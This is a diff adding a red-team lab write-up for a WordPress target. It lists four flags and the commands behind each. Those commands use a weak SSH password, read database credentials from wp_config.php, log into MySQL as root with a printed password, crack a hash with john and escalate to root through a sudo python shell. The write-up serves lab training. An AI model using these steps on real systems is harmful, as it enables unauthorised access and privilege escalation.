@@ -352,3 +352,41 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 * ssh michael@192.168.1.110
 * cd /var/www
 * cat flag2.txt
+
+* Target 1
+    * flag1.txt: b9bbcb33e11b80be759c4e844862482d
+        * Exploit Used
+            * Weak Password / SSH with password
+                * After SSHing into the host with michael's credentials, we were able to search the /var/www/html directory for flag1.
+            * Commands run:
+                * ssh michael@192.168.1.100
+                * cd /var/www/html
+                * grep -ER flag1
+    * flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c
+        * Exploit Used
+            * Weak Password / SSH with password
+                * After SSHing into the host with michael's credentials, flag2 was found right in /var/www
+            * Commands run:
+                * ssh michael@192.168.1.100
+                * cd /var/www
+                * cat flag2.txt
+    * flag3.txt: afc01ab56b50591e7dccf93122770cd2
+        * Exploit Used
+            * Database credentials in plain text
+                * After getting the database credentials from /var/www/html/wp_config.php, we connected to the mysql database and searched for the flag.
+            * Commands run:
+                * ssh michael@192.168.1.100
+                * less /var/www/html/wp_config.php
+                * mysql --user root --password # Password is R@v3nSecurity
+                * mysql> SELECT post_title, post_content FROM wp_posts WHERE post_title LIKE "flag%";
+                * This returned the value for flag 3
+    * flag4.txt: 715dea6c055b9fe3337544932f2941ce
+        * Exploit Used
+            * python can run with sudo
+                * After cracking steven's password using john and the hash found in the database, we determined that user steven could run python with sudo permissions.
+                * This allows us to use python as sudo to execute a shell program, thereby granting us access to the root account.
+                * flag4.txt was found in the /root directory, the root account's home directory.
+            * Commands run:
+                * python -c 'import os; os.system("/bin/sh")'
+                * cat flag4.txt
+
